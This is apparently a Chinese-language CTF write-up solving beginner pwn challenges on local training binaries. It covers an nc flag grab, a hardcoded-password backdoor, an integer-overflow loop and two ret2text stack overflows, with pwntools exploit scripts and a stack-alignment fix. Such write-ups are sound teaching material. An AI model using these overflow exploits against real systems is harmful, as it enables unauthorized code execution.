# Writeup 标题
- ID:deepsick
- 方向：Pwn
- 日期：2026-04-10

---

## 题目wp

### 1. test_your_nc

```
nc node5.buuoj.cn26679
```
flag{6308373e-e149-4bc0-9a22-f4931daf4e96}

---

### 2.door

ida，输入密码，有if判断
输入该密码7038329，得到shell

<img width="727" height="391" alt="image" src="https://github.com/user-attachments/assets/8f20c66c-8666-477a-80a7-8f1016da8159" />

---

### 3.INTbug(本地)
ida发现一个无限循环，每次v1++，但v1<0得sh，故要让v1增加到int溢出(32768)次

<img width="931" height="775" alt="image" src="https://github.com/user-attachments/assets/367ea13f-65bb-44c2-bbfc-510d34cac132" />

```
//py
from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io=process("/home/duck/SpringTraining/INTbug")

io.recvuntil("welcome to NewStarCTF2025!\n")
for i in range(32768):
    io.sendline(b"1")

io.interactive()
```

---

### 4.pwn_37
checksec 一下,32位无栈保护，PIE，但NX开启
ida一下，看到一个backdoor函数里有sh，main里有ctfshow()，里面的read有一个50-14=36的溢出
编写exp
```
from pwn import *

context(log_level="debug", arch="i386", os="linux")
io=process("/home/duck/SpringTraining/pwn_37")
io.recvuntil(b'Just very easy ret2text&&32bit')
key = 0x08048521
payload = b'a' * 22 + p32(key)
io.sendline(payload)
io.interactive()
```
运行得到sh
<img width="889" height="479" alt="image" src="https://github.com/user-attachments/assets/5c9e13e7-a92d-4f7b-8199-f132fe3505e4" />


---

### 5.pwn_38
checksec 一下,64位无栈保护，PIE，但NX开启
ida一下，同样的read漏洞，同样的backdoor()
构建脚本
```
from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io=process("/home/duck/SpringTraining/pwn_38")
io.recvuntil(b'Just easy ret2text&&64bit')
key =0x0000000000400657
payload = b'a' * 18 + p64(key)
io.sendline(payload)
io.interactive()
```
运行失败
再次ida，分析栈帧
sh在backdoor里，但覆盖返回地址后未正确执行sh
call时要进行栈对齐，即rsp%16==0
```
000 push    rbp
008 mov     rbp, rsp
008 sub     rsp, 10h
018 lea     rax, [rbp+buf]
018 mov     edx, 32h ; '2'  ; nbytes
018 mov     rsi, rax        ; buf
018 mov     edi, 0          ; fd
018 call    _read
```
010h,000h,020h%16==0,所以不能直接到0x400657，会使rsp%16=8,从`000 push    rbp` 后开始执行，保证栈对齐
重编写脚本xp:
```
//py
from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io=process("/home/duck/SpringTraining/pwn_38")
io.recvuntil(b'Just easy ret2text&&64bit')
key =0x0000000000400658
payload = b'a' * 18+ p64(key)
io.sendline(payload)
io.interactive()
```
得sh

<img width="932" height="525" alt="image" src="https://github.com/user-attachments/assets/de0bbe5f-a6de-428c-bddc-d897971c8e95" />

---
